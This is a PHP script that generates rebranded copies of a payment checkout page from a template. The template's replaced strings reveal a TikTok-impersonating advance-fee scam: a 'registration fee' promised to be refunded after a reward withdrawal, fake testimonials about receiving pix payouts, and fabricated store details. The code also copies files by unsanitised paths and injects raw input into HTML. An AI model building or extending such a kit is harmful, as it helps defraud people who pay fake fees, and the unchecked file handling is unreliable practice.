<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0);

try {
    // Receber dados do builder
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (!$data) {
        throw new Exception('Dados inválidos ou vazios');
    }

    // Gerar nome único para a pasta
    $checkoutId = uniqid('checkout_');
    $checkoutPath = '../checkouts/' . $checkoutId;

    // Criar pasta checkouts se não existir
    if (!file_exists('../checkouts')) {
        if (!mkdir('../checkouts', 0755, true)) {
            throw new Exception('Erro ao criar pasta checkouts');
        }
    }

    // Criar pasta do checkout
    if (!mkdir($checkoutPath, 0755, true)) {
        throw new Exception('Erro ao criar pasta do checkout');
    }

    // Carregar HTML base
    $htmlPath = '../index.html';
    if (!file_exists($htmlPath)) {
        throw new Exception('Arquivo index.html não encontrado');
    }
    
    $html = file_get_contents($htmlPath);

    // Aplicar substituições
    $price = number_format($data['product']['price'], 2, '.', '');
    $priceFormatted = number_format($data['product']['price'], 2, ',', '');

    $replacements = [
        'Taxa de Cadastro - Essa taxa será reembolsada 100% após o saque' => $data['product']['name'] . ' - ' . $data['product']['description'],
        'Taxa de Cadastro' => $data['product']['name'],
        'Essa taxa será reembolsada 100% após o saque' => $data['product']['description'],
        '24.56' => $price,
        '24,56' => $priceFormatted,
        'https://cdn.optimuspay.io/products/uploads/019c3e60-2266-71ae-9908-a0a466a82fd1.png' => $data['product']['image'],
        'Tik Tok' => $data['store']['name'],
        './img_6988cc48b4e0b7.png' => './assets/' . basename($data['store']['logo']),
        '27.415.911/0001-36' => $data['store']['cnpj'],
        'tiktokpay@contato.com' => $data['store']['email'],
        'tiktokshop @contato.com' => $data['store']['email'],
        
        // Depoimentos
        'TikTok Brasil' => $data['testimonials'][0]['name'],
        '+ de 287.983 Recompensas foram enviadas.' => $data['testimonials'][0]['text'],
        'https://cdn.optimuspay.io/stores/6966/theme/img_6988ceb3d04ca9.16287872.webp' => $data['testimonials'][0]['image'],
        
        'Luana Silva' => $data['testimonials'][1]['name'],
        'Consegui sacar mais de 2 mil reais e paguei o meu aluguel, tiktok sempre salvando a gente quando mais precisamos, obrigado.' => $data['testimonials'][1]['text'],
        'https://cdn.optimuspay.io/stores/6966/theme/img_696da91fc806b2.89369199.webp' => $data['testimonials'][1]['image'],
        
        'Fernando Oliveira' => $data['testimonials'][2]['name'],
        'obrigado tiktok, fiz o passo a passo certinho e o pix caiiu na minha conta.' => $data['testimonials'][2]['text'],
        'https://cdn.optimuspay.io/stores/6966/theme/img_696da9203b9d41.47431713.webp' => $data['testimonials'][2]['image'],
    ];

    foreach ($replacements as $search => $replace) {
        $html = str_replace($search, $replace, $html);
    }

    // Ajustar caminhos dos CSS para a pasta assets
    $html = preg_replace('/href="\.\/([a-j]\.css)"/', 'href="./assets/$1"', $html);
    $html = str_replace('src="./loading-payment.gif"', 'src="./assets/loading-payment.gif"', $html);

    // Salvar HTML
    if (file_put_contents($checkoutPath . '/index.html', $html) === false) {
        throw new Exception('Erro ao salvar index.html');
    }

    // Salvar configurações
    if (file_put_contents($checkoutPath . '/config.json', json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) === false) {
        throw new Exception('Erro ao salvar config.json');
    }

    // Criar pasta assets e copiar arquivos CSS
    $assetsPath = $checkoutPath . '/assets';
    if (!mkdir($assetsPath, 0755, true)) {
        throw new Exception('Erro ao criar pasta assets');
    }

    $cssFiles = ['a.css', 'b.css', 'c.css', 'd.css', 'e.css', 'f.css', 'g.css', 'h.css', 'i.css', 'j.css'];
    $copiedFiles = 0;
    foreach ($cssFiles as $cssFile) {
        if (file_exists('../' . $cssFile)) {
            if (copy('../' . $cssFile, $assetsPath . '/' . $cssFile)) {
                $copiedFiles++;
            }
        }
    }

    // Copiar loading gif
    if (file_exists('../loading-payment.gif')) {
        copy('../loading-payment.gif', $assetsPath . '/loading-payment.gif');
    }

    // Copiar logo se for local
    if (isset($data['store']['logo']) && strpos($data['store']['logo'], 'http') === false) {
        $logoPath = '../' . $data['store']['logo'];
        if (file_exists($logoPath)) {
            copy($logoPath, $assetsPath . '/' . basename($data['store']['logo']));
        }
    }

    // Criar README
    $readme = "# Checkout: {$data['store']['name']}

## Informações do Checkout

- **ID**: {$checkoutId}
- **Produto**: {$data['product']['name']}
- **Preço**: R$ {$priceFormatted}
- **Loja**: {$data['store']['name']}
- **Data de Criação**: " . date('d/m/Y H:i:s') . "

## Arquivos

- `index.html` - Página do checkout
- `config.json` - Configurações do checkout
- `assets/` - Arquivos CSS e imagens ({$copiedFiles} arquivos CSS copiados)

## Como usar

1. Faça upload de todos os arquivos para seu servidor
2. Acesse index.html no navegador
3. Configure os gateways de pagamento conforme necessário
";

    file_put_contents($checkoutPath . '/README.md', $readme);

    echo json_encode([
        'success' => true,
        'checkoutId' => $checkoutId,
        'path' => $checkoutPath,
        'url' => '/checkouts/' . $checkoutId . '/index.html',
        'filesCreated' => [
            'index.html' => file_exists($checkoutPath . '/index.html'),
            'config.json' => file_exists($checkoutPath . '/config.json'),
            'README.md' => file_exists($checkoutPath . '/README.md'),
            'cssFiles' => $copiedFiles
        ]
    ]);

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage(),
        'trace' => $e->getTraceAsString()
    ]);
}
?>
